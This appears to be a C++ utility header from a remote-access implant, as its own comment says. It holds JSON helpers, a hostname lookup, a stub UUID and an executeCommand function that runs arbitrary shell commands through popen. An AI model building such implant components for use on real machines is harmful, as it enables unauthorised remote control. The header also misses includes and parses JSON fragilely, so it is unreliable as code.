#ifndef UTILS_HPP
#define UTILS_HPP

#define POPEN popen
#define PCLOSE pclose

namespace Utils {
    std::string getJsonValue(const std::string& json, const std::string& key) {
        std::string search = "\"" + key + "\":";
        size_t startPos = json.find(search);
        
        if (startPos == std::string::npos) return "";

        startPos += search.length();

        while (startPos < json.length() && (json[startPos] == ' ' || json[startPos] == ':')) {
            startPos++;
        }

        if (json[startPos] == '"') {    // string
            size_t startQuote = startPos;
            size_t endQuote = json.find("\"", startQuote + 1);

            if (endQuote == std::string::npos) {
                return "";
            }

            return json.substr(startQuote + 1, endQuote - startQuote - 1);
        } else {    // num or bool
            size_t endPos = json.find_first_of(",}", startPos);

            if (endPos == std::string::npos) {
                return "";
            }

            return json.substr(startPos, endPos - startPos);
        }
    }

    std::string jsonEscape(const std::string& json) {
        std::string output;

        for (char c : json) {
            switch (c) {
                case '"': output += "\\\""; break;
                case '\\': output += "\\\\"; break;
                case '\b': output += "\\b"; break;
                case '\f': output += "\\f"; break;
                case '\n': output += "\\n"; break;
                case '\r': output += "\\r"; break;
                case '\t': output += "\\t"; break;
                default: output += c; break;
            }
        }

        return output;
    }

    std::string executeCommand(const std::string& command) {
        std::array<char, 128> buffer;
        std::string result;
        std::string fullCommand = command + " 2>&1";    // i've read it's generally good practice to redirect stderr in these kinds of implants

        FILE* pipe = POPEN(fullCommand.c_str(), "r");
        if (!pipe) {
            return "ERROR opening pipe";
        }

        while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
            result += buffer.data();
        }

        PCLOSE(pipe);

        return result;
    }

    std::string getHostname() {
        char hostname[1024];

        if (gethostname(hostname, 1024) == 0) {
            return std::string(hostname);
        }

        return "unknown";
    }

    // TODO: code from https://antonz.org/uuidv7/#cpp by Anton Zhiyanov
    // TODO: modified to return string instead
    std::string generateUuid() {
        return "test-ghost-1";
    }
}

#endif